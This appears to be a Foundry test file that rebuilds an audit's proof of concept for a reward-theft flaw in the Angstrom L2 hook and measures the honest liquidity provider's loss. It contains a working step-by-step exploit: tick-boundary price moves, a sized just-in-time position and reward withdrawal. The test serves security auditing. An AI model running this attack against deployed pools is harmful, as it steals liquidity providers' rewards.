// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Loss measurement for finding 63008 (Cyfrin, Sorella L2 Angstrom):
// "All rewards can be stolen due to incorrect active liquidity calculations when
//  the current tick is an exact multiple of the tick spacing at the upper end of
//  a liquidity range."
//
// This is the report's Proof of Concept #3 (test_cyfrin_stealAllRewards), with
// one change: the honest liquidity provider (LP), the trader who builds up
// rewards, and the attacker are three separate accounts. In the published PoC
// all three were the same router, so the money that moved between them could
// not be told apart. Here we measure:
//   1. the honest LP's pending rewards just before the attack (the user funds),
//   2. the rewards the attacker collects and the attacker's net profit,
//   3. how much of the honest LP's owed rewards the hook can still pay,
//   4. whether the honest LP can claim rewards or remove liquidity afterwards.
// The swap tax is paid in ether (currency0), so every reward amount is in wei.
// Runs only offline, against local audited code, with mock tokens.

import {AngstromL2Test} from "./AngstromL2.t.sol";
import {RouterActor} from "./_mocks/RouterActor.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {SqrtPriceMath} from "v4-core/src/libraries/SqrtPriceMath.sol";
import {PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {IUniV4} from "../src/interfaces/IUniV4.sol";
import {UniV4Inspector} from "./_mocks/UniV4Inspector.sol";
import {console} from "forge-std/console.sol";

contract Loss63008_AngstromL2 is AngstromL2Test {
    using TickMath for int24;
    using PoolIdLibrary for PoolKey;
    using IUniV4 for UniV4Inspector;

    // Same sizes as the published PoC #3.
    uint128 constant INIT_LIQUIDITY = 1e22;
    uint256 constant LOOPS_TO_BUILD_UP_REWARDS = 5;
    uint256 constant PRIORITY_FEE_TO_BUILD_UP_REWARDS = 1000 gwei;
    uint256 constant ATTACKER_PRIORITY_FEE = 5 gwei;
    int24 constant INIT_T0 = 0;
    int24 constant INIT_T1 = 50;
    int24 constant START_TICK = 17;
    int24 constant ATTACK_UPPER = 20; // first tick boundary above START_TICK
    int24 constant ATTACK_LOWER = 10;

    RouterActor honestLp;
    RouterActor trader;
    RouterActor attacker;
    PoolKey key;

    uint256 honestPendingBefore;
    uint256 attackLiquidity;

    function _hookEther() internal view returns (uint256) {
        return manager.balanceOf(address(angstrom), 0);
    }

    function _logInt(string memory label, int256 v) internal pure {
        console.log(string.concat(label, vm.toString(v)));
    }

    function _setUpAndBuildRewards() internal {
        honestLp = router; // funded in setUp: 100 ether and 1e27 token
        trader = new RouterActor(manager);
        attacker = new RouterActor(manager);
        vm.deal(address(trader), 1000 ether);
        token.mint(address(trader), 1_000_000_000e18);
        vm.deal(address(attacker), 100 ether);
        token.mint(address(attacker), 1_000_000_000e18);

        key = initializePool(address(token), 10, START_TICK);

        // Honest LP provides liquidity over [0, 50).
        honestLp.modifyLiquidity(key, INIT_T0, INIT_T1, int256(uint256(INIT_LIQUIDITY)), 0);

        // A trader swaps back and forth with a high priority fee. The swap tax is
        // credited to the honest LP as rewards.
        setPriorityFee(PRIORITY_FEE_TO_BUILD_UP_REWARDS);
        for (uint256 i = 0; i < LOOPS_TO_BUILD_UP_REWARDS; i++) {
            bumpBlock();
            trader.swap(key, true, -10_000e18, int24(INIT_T0 + 1).getSqrtPriceAtTick());
            bumpBlock();
            trader.swap(key, false, -10_000e18, int24(START_TICK).getSqrtPriceAtTick());
        }

        honestPendingBefore =
            angstrom.getPendingPositionRewards(key, address(honestLp), INIT_T0, INIT_T1, 0);

        console.log("=== BEFORE ATTACK ===");
        console.log(
            "swap tax paid by trader (wei):         ",
            angstrom.getSwapTaxAmount(PRIORITY_FEE_TO_BUILD_UP_REWARDS) * LOOPS_TO_BUILD_UP_REWARDS * 2
        );
        console.log("honest LP pending rewards (wei):       ", honestPendingBefore);
        console.log("hook ether claims (wei):               ", _hookEther());
        console.log("hook protocol revenue (wei):           ", angstrom.unclaimedProtocolRevenueInEther());
    }

    function _attack() internal {
        uint256 ethBefore = address(attacker).balance;
        uint256 tokBefore = token.balanceOf(address(attacker));

        // Step 1: move the price up to the boundary tick 20 with no priority fee.
        setPriorityFee(0);
        bumpBlock();
        attacker.swap(key, false, -10_000e18, ATTACK_UPPER.getSqrtPriceAtTick());

        // Step 2: size the JIT position so its reward share equals the honest rewards.
        uint256 swapTax = angstrom.getSwapTaxAmount(ATTACKER_PRIORITY_FEE);
        uint128 ratio = uint128(honestPendingBefore) * 10_000 / uint128(swapTax);
        attackLiquidity = INIT_LIQUIDITY * ratio / 10_000;

        bumpBlock();
        setPriorityFee(ATTACKER_PRIORITY_FEE);
        attacker.modifyLiquidity(key, ATTACK_LOWER, ATTACK_UPPER, int256(attackLiquidity), 0);
        // Step 3: top-of-block swap back down, to just below the boundary.
        attacker.swap(key, true, -10e18, (ATTACK_UPPER - 1).getSqrtPriceAtTick());

        uint256 attackRewards =
            angstrom.getPendingPositionRewards(key, address(attacker), ATTACK_LOWER, ATTACK_UPPER, 0);
        uint256 hookEtherBeforeExit = _hookEther();

        // Step 4: remove the JIT position, collecting its rewards.
        attacker.modifyLiquidity(key, ATTACK_LOWER, ATTACK_UPPER, -int256(attackLiquidity), 0);

        console.log("=== ATTACK ===");
        console.log("attack liquidity in [10,20):           ", attackLiquidity);
        console.log("swap tax paid by attacker (wei):       ", swapTax);
        console.log("JIT tax charged on add (wei):          ", angstrom.getJitTaxAmount(ATTACKER_PRIORITY_FEE));
        console.log("attacker pending rewards (wei):        ", attackRewards);
        console.log("hook ether paid out to attacker (wei): ", hookEtherBeforeExit - _hookEther());

        int256 ethDelta = int256(address(attacker).balance) - int256(ethBefore);
        int256 tokDelta = int256(token.balanceOf(address(attacker))) - int256(tokBefore);
        uint256 sp = TickMath.getSqrtPriceAtTick(START_TICK);
        uint256 price = sp * sp * 1e18 / 2 ** 192; // token per ether at START_TICK
        _logInt("attacker ether delta (wei):            ", ethDelta);
        _logInt("attacker token delta (token wei):      ", tokDelta);
        _logInt("attacker net profit in ether (wei):    ", ethDelta + tokDelta * 1e18 / int256(price));
    }

    function test_loss_stealAllRewards() public {
        _setUpAndBuildRewards();
        _attack();

        // After the attack: does the hook still hold enough ether to pay the honest LP?
        uint256 honestPendingAfter =
            angstrom.getPendingPositionRewards(key, address(honestLp), INIT_T0, INIT_T1, 0);
        uint256 etherBackingLpRewards = _hookEther() - angstrom.unclaimedProtocolRevenueInEther();
        uint256 unbacked =
            honestPendingAfter > etherBackingLpRewards ? honestPendingAfter - etherBackingLpRewards : 0;

        console.log("=== AFTER ATTACK ===");
        console.log("honest LP pending rewards (wei):       ", honestPendingAfter);
        console.log("hook ether claims (wei):               ", _hookEther());
        console.log("hook protocol revenue (wei):           ", angstrom.unclaimedProtocolRevenueInEther());
        console.log("hook ether left for LP rewards (wei):  ", etherBackingLpRewards);
        console.log("honest LP rewards with no ether (wei): ", unbacked);

        // Honest LP tries to collect rewards only (liquidity delta 0), in a later block.
        bumpBlock();
        setPriorityFee(0);
        uint256 lpEth0 = address(honestLp).balance;
        bool claimOk;
        try honestLp.modifyLiquidity(key, INIT_T0, INIT_T1, 0, 0) {
            claimOk = true;
        } catch (bytes memory err) {
            console.log("honest LP reward claim revert data:");
            console.logBytes(err);
        }
        uint256 rewardsClaimed = address(honestLp).balance - lpEth0;
        console.log("honest LP reward claim succeeded:      ", claimOk);
        console.log("honest LP rewards received (wei):      ", rewardsClaimed);

        // Honest LP tries to remove all its liquidity. Principal value at the current price:
        uint160 sqrtP = manager.getSlot0(key.toId()).sqrtPriceX96();
        console.log(
            "honest LP principal, ether part (wei): ",
            SqrtPriceMath.getAmount0Delta(sqrtP, INIT_T1.getSqrtPriceAtTick(), INIT_LIQUIDITY, false)
        );
        console.log(
            "honest LP principal, token part (wei): ",
            SqrtPriceMath.getAmount1Delta(INIT_T0.getSqrtPriceAtTick(), sqrtP, INIT_LIQUIDITY, false)
        );
        uint256 lpTok0 = token.balanceOf(address(honestLp));
        lpEth0 = address(honestLp).balance;
        bool removeOk;
        try honestLp.modifyLiquidity(key, INIT_T0, INIT_T1, -int256(uint256(INIT_LIQUIDITY)), 0) {
            removeOk = true;
        } catch {}
        console.log("honest LP full removal succeeded:      ", removeOk);
        console.log("ether returned on removal (wei):       ", address(honestLp).balance - lpEth0);
        console.log("token returned on removal (token wei): ", token.balanceOf(address(honestLp)) - lpTok0);

        // Loss = honest-LP rewards owed before the attack that the honest LP did not receive.
        uint256 lost = honestPendingBefore > rewardsClaimed ? honestPendingBefore - rewardsClaimed : 0;
        console.log("=== SUMMARY ===");
        console.log("user funds = honest LP pending rewards before attack (wei):", honestPendingBefore);
        console.log("honest LP loss = pending before minus rewards received (wei):", lost);
        console.log("loss as share of honest rewards (basis points):", lost * 10_000 / honestPendingBefore);
        console.log("unbacked rewards as share of honest rewards (basis points):", unbacked * 10_000 / honestPendingBefore);
    }
}
